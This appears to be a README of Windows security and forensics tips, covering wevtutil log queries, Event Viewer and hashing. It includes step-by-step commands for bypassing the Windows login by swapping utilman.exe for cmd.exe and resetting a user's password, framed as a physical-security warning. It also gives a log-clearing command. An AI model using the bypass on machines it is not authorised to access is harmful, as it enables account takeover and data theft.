# security
cool tricks to securing and some how a little forensics.keep in mind that win+x in windows os opens a menu bar that you can control so many other options too.

<ul>
<li>Wevtutil</li>
<li>Event Viewer</li>
<li>Bypass windows Login</li>
<li>Calculate hash of a File</li>
<li>Check if you are local Administrator</li>
</ul>

# Wevtutil
Enables you to retrieve information about event logs and publishers in powershell,cmd, and also git bash.

<ul>
<li>To see last 50 login in our device:

    wevtutil qe Security /c:50 /rd:true /f:text
  
<p>you should be administrator to run this command</p>
</li>
<li>Find the last 20 startup events in the System log:

    wevtutil query-events System /count:20 /rd:true /format:text /q:"Event[System[(EventID=12)]]"

</li>
<li>Display the status of the Application log:

    wevtutil gli Application

</li>
<li>Clear all the events from the Application log:

    wevtutil clear-log Application
    
</li>
</ul>

# Event Viewer
Event Viewer is a component of Microsoft's Windows operating system that lets administrators and users view the event logs on a local or remote machine.just type:

    eventvwr

# Recover windows without password
as you may know you can open accounts on any windows machine without any passwords by just a windwos bootable usb .this is why you should be aware of physical security.when installation go repair this pc and open command prompt and type this command.

    move c:\windows\system32\utilman.exe c:\ 

<p>c is directory that windows is installed,and maybe it is different in your pc.and then this command:</p>

    copy c:\windows\system32\cmd.exe c:\windows\system32\utilman.exe


<p>after all:</p>


    wpeutil reboot

<p>after the reboot  click on ease of use,CMD will opens then type:</p>

    net user

<p>after you saw users then the user you want to login with:</p>

    net user <desired user> <your password>

<p> you are in windows now!</p>

# Calculate hash Calculate hash of a File
to calculate hash (sha1.sha256,md5) of a given File just enter the path to that file and you have the hash.

# Check if you are local Administrator
to check if you are local Administrator just run this script

    check_admin.bat